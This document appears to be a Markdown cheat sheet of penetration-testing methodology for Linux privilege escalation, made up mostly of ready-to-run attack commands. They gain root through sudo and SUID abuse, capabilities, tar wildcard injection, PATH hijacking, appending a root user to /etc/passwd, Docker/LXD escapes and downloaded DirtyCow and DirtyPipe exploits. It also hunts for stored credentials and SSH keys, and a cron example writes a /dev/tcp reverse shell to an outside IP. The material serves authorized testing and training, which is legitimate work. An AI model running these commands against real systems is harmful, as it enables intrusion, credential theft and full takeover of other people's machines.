# Linux Privilege Escalation - Complete Methodology

## 📋 Overview

Privilege escalation is the process of exploiting a vulnerability, design flaw, or configuration oversight to gain elevated access to resources that are normally protected from an application or user.

**Goal**: Gain root/administrator access from a low-privileged user

---

## 🎯 When to Perform PrivEsc

- ✅ After gaining initial shell access
- ✅ When current user has limited permissions
- ✅ Need to access protected files/directories
- ✅ Want to establish persistence
- ✅ Need to pivot to other systems

---

## 🔄 Linux PrivEsc Methodology

```
┌─────────────────────────────────────────┐
│ 1. Situational Awareness                │
│    └─ Who am I? Where am I?             │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 2. Automated Enumeration                │
│    └─ LinPEAS, LinEnum, LSE             │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 3. Manual Enumeration                   │
│    └─ Systematic checks                 │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 4. Identify Vectors                     │
│    └─ SUID, sudo, cron, etc.            │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 5. Exploit Vector                       │
│    └─ Execute privilege escalation      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 6. Verify Root Access                   │
│    └─ id, whoami, cat /etc/shadow       │
└─────────────────────────────────────────┘
```

---

## 🔍 Phase 1: Situational Awareness

### Basic Information
```bash
# Current user
whoami
id

# Hostname
hostname

# OS version
cat /etc/os-release
cat /etc/issue
uname -a
uname -r  # Kernel version

# Current shell
echo $SHELL
echo $0

# Current directory
pwd

# Home directory
echo $HOME
ls -la ~
```

### User Information
```bash
# All users
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false

# Users with bash shell
cat /etc/passwd | grep bash

# Current user groups
groups
id

# All groups
cat /etc/group

# Sudo version (for exploits)
sudo -V
```

### Network Information
```bash
# Network interfaces
ip a
ifconfig

# Routing table
ip route
route -n

# ARP table
ip neigh
arp -a

# Listening ports
netstat -tulpn
ss -tulpn

# Active connections
netstat -antp
ss -antp

# DNS configuration
cat /etc/resolv.conf

# Hosts file
cat /etc/hosts
```

### Running Processes
```bash
# All processes
ps aux
ps -ef

# Processes by user
ps aux | grep root
ps aux | grep $USER

# Process tree
pstree -p

# Top processes
top -n 1
```

---

## 🤖 Phase 2: Automated Enumeration

### LinPEAS (Recommended)
```bash
# Download
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Or
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Make executable
chmod +x linpeas.sh

# Run
./linpeas.sh

# Run with output to file
./linpeas.sh | tee linpeas_output.txt

# Run specific checks only
./linpeas.sh -a  # All checks
./linpeas.sh -s  # Superfast (no banner)
./linpeas.sh -P  # Passwords
```

### LinEnum
```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Run
chmod +x LinEnum.sh
./LinEnum.sh

# Thorough mode
./LinEnum.sh -t

# With keyword search
./LinEnum.sh -k password
```

### Linux Smart Enumeration (LSE)
```bash
# Download
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# Run
chmod +x lse.sh
./lse.sh

# Different levels
./lse.sh -l 0  # Basic
./lse.sh -l 1  # Interesting
./lse.sh -l 2  # Detailed (recommended)
```

### pspy (Process Monitoring)
```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Run
chmod +x pspy64
./pspy64

# Monitor for cron jobs and processes
```

---

## 🔍 Phase 3: Manual Enumeration

### Sudo Rights (HIGH PRIORITY)
```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/find
# (ALL) NOPASSWD: /usr/bin/vim
# (ALL) NOPASSWD: /usr/bin/python*
# (ALL) NOPASSWD: /usr/bin/perl
# (ALL) NOPASSWD: /usr/bin/less
# (ALL) NOPASSWD: /usr/bin/more
# (ALL) NOPASSWD: /usr/bin/awk
# (ALL) NOPASSWD: /usr/bin/man
# (ALL) NOPASSWD: /usr/bin/git
# (ALL) NOPASSWD: /usr/bin/wget
# (ALL) NOPASSWD: /usr/bin/curl
```

**GTFOBins Reference**: https://gtfobins.github.io/

### SUID Binaries (HIGH PRIORITY)
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 2>/dev/null

# Common exploitable SUID binaries:
# /usr/bin/find
# /usr/bin/vim
# /usr/bin/python*
# /usr/bin/perl
# /usr/bin/php
# /usr/bin/ruby
# /usr/bin/nmap (old versions)
# /usr/bin/cp
# /usr/bin/mv
# /usr/bin/bash
# /usr/bin/less
# /usr/bin/more
# /usr/bin/nano
```

### Capabilities
```bash
# List all capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid+ep
# cap_dac_read_search+ep
# cap_dac_override+ep

# Example exploits:
# python with cap_setuid+ep
# tar with cap_dac_read_search+ep
```

### Cron Jobs
```bash
# System-wide cron
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d
ls -la /etc/cron.daily
ls -la /etc/cron.hourly
ls -la /etc/cron.monthly
ls -la /etc/cron.weekly

# User cron jobs
crontab -l
ls -la /var/spool/cron/crontabs/

# Check for writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
```

### Writable Files and Directories
```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# Files owned by current user
find / -user $(whoami) 2>/dev/null

# Writable /etc files (critical)
find /etc -writable -type f 2>/dev/null

# Check if /etc/passwd is writable
ls -la /etc/passwd

# Check if /etc/shadow is readable
ls -la /etc/shadow
```

### PATH Hijacking
```bash
# Check current PATH
echo $PATH

# Look for writable directories in PATH
echo $PATH | tr ':' '\n' | while read dir; do ls -ld "$dir" 2>/dev/null; done

# Find SUID binaries that might use relative paths
strings /path/to/suid/binary | grep -E '^[a-z]'
```

### NFS Root Squashing
```bash
# Check NFS exports
cat /etc/exports

# Look for no_root_squash
# If found, can mount share and create SUID binary
```

### Kernel Exploits
```bash
# Kernel version
uname -a
uname -r

# Search for exploits
searchsploit linux kernel $(uname -r)

# Common kernel exploits:
# DirtyCow (CVE-2016-5195)
# DirtyPipe (CVE-2022-0847)
# PwnKit (CVE-2021-4034)
```

### Passwords and Credentials
```bash
# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history

# Configuration files
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.config" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.ini" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Backup files
find / -name "*.bak" 2>/dev/null
find / -name "*backup*" 2>/dev/null

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
find / -name known_hosts 2>/dev/null

# Check for passwords in files
grep -r -i "password" /home 2>/dev/null
grep -r -i "pass=" /home 2>/dev/null
```

### Environment Variables
```bash
# Display all environment variables
env
printenv

# Check for sensitive info
env | grep -i pass
env | grep -i key
env | grep -i secret
env | grep -i token
```

---

## 🎯 Phase 4: Exploitation Techniques

### 1. Sudo Exploitation

#### Example: sudo find
```bash
# If you can run: sudo find
sudo find . -exec /bin/bash \; -quit
```

#### Example: sudo vim
```bash
# If you can run: sudo vim
sudo vim -c ':!/bin/bash'
# Or within vim
:set shell=/bin/bash
:shell
```

#### Example: sudo python
```bash
# If you can run: sudo python
sudo python -c 'import os; os.system("/bin/bash")'
```

#### Example: sudo less/more
```bash
# If you can run: sudo less
sudo less /etc/profile
# Then press: !bash
```

#### Example: sudo awk
```bash
# If you can run: sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### Example: sudo git
```bash
# If you can run: sudo git
sudo git -p help
# Then press: !bash
```

### 2. SUID Binary Exploitation

#### Example: SUID find
```bash
# If find has SUID bit
find . -exec /bin/bash -p \; -quit
```

#### Example: SUID vim
```bash
# If vim has SUID bit
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'
```

#### Example: SUID python
```bash
# If python has SUID bit
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

#### Example: SUID bash
```bash
# If bash has SUID bit
bash -p
```

#### Example: SUID cp
```bash
# If cp has SUID bit
# Copy /etc/passwd, add user, copy back
cp /etc/passwd /tmp/passwd
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su hacker
```

### 3. Capabilities Exploitation

#### Example: python with cap_setuid+ep
```bash
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Example: tar with cap_dac_read_search+ep
```bash
# If tar has cap_dac_read_search+ep
# Can read any file
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

### 4. Cron Job Exploitation

#### Writable Cron Script
```bash
# If cron script is writable
echo 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' >> /path/to/cron/script.sh

# Or add SUID bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/cron/script.sh
# Wait for cron to run
/tmp/bash -p
```

#### Wildcard Injection
```bash
# If cron runs: tar -czf /backup/*.tar.gz /var/www/html/*
# Create malicious files
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /var/www/html/shell.sh
chmod +x /var/www/html/shell.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ shell.sh
# Wait for cron
/tmp/bash -p
```

### 5. Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$qJH7.N4xYta3aEG/dfqo/0

# Add new root user
echo 'hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
# Password: password123
```

### 6. PATH Hijacking

```bash
# If SUID binary calls 'ls' without full path
# Create malicious ls
echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls

# Add /tmp to PATH
export PATH=/tmp:$PATH

# Run SUID binary
/path/to/suid/binary
```

### 7. NFS Root Squashing

```bash
# On attacker machine (as root)
# Mount NFS share
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs

# Create SUID binary
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target machine
/share/bash -p
```

### 8. Kernel Exploits

#### DirtyCow (CVE-2016-5195)
```bash
# Download exploit
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c

# Compile
gcc -pthread dirty.c -o dirty -lcrypt

# Run
./dirty password123

# Switch to firefart user
su firefart
# Password: password123
```

#### DirtyPipe (CVE-2022-0847)
```bash
# Download exploit
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

# Compile
gcc exploit-1.c -o exploit

# Run
./exploit
```

---

## 💡 Pro Tips

### 1. Always Check Sudo First
```bash
sudo -l
# This is the easiest and most common vector
```

### 2. Use GTFOBins
```bash
# For any binary you can run with sudo or SUID
# Check: https://gtfobins.github.io/
```

### 3. Monitor Processes
```bash
# Use pspy to find cron jobs
./pspy64
```

### 4. Check for Docker
```bash
# If user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

### 5. LXD/LXC Exploitation
```bash
# If user is in lxd group
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root
```

### 6. Check for Tmux/Screen Sessions
```bash
# List tmux sessions
tmux ls

# Attach to session
tmux attach -t 0

# List screen sessions
screen -ls

# Attach to session
screen -r
```

### 7. Exploit Sudo Version
```bash
# Check sudo version
sudo -V

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# Use exploit from GitHub
```

---

## ⚠️ Common Mistakes

1. ❌ Not checking `sudo -l` first
2. ❌ Forgetting `-p` flag with SUID bash
3. ❌ Not using automated tools
4. ❌ Ignoring cron jobs
5. ❌ Not checking capabilities
6. ❌ Skipping kernel version check
7. ❌ Not monitoring processes with pspy
8. ❌ Forgetting to check for Docker/LXD
9. ❌ Not searching for passwords in files
10. ❌ Giving up too early

---

## ✅ PrivEsc Checklist

- [ ] Run `sudo -l`
- [ ] Find SUID binaries
- [ ] Check capabilities
- [ ] Enumerate cron jobs
- [ ] Check writable files
- [ ] Search for passwords
- [ ] Check kernel version
- [ ] Run LinPEAS
- [ ] Monitor processes with pspy
- [ ] Check for Docker/LXD
- [ ] Look for NFS shares
- [ ] Check PATH
- [ ] Enumerate network services
- [ ] Check for tmux/screen sessions

---

## 📚 Related Resources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Post-Exploitation](../04-Post-Exploitation/Situational-Awareness.md)
- [Quick Reference](../09-Quick-Reference/Exam-Checklist.md)

---

**Remember**: Privilege escalation is about systematic enumeration. Don't skip steps!
